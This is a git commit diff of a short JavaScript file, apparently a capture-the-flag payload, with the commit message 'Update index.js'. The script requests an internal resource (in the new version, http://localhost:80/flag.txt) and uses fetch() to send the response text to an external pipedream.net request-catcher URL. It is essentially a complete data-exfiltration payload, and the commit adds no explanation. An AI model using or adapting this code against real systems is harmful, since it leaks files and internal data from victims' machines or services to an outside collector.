39731783f80cad6c8796df58b3bc720e86567aa4
as3617 <46442697+as3617@users.noreply.github.com>
2020-03-15 00:35:00 +0900

    Update index.js

--- index.js
+++ index.js
@@ -1,8 +1,8 @@
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://104.27.137.89:80/static/");
+xhr.open("GET", "http://localhost:80/flag.txt");
 xhr.onreadystatechange = function() {
     text = xhr.responseText;
     console.log(xhr.getAllResponseHeaders());
-    fetch('https://encnu1395lyv7.x.pipedream.net/?q=' + xhr.getAllResponseHeaders());
+    fetch('https://encnu1395lyv7.x.pipedream.net/?q=' + text);
 };
 xhr.send(null);
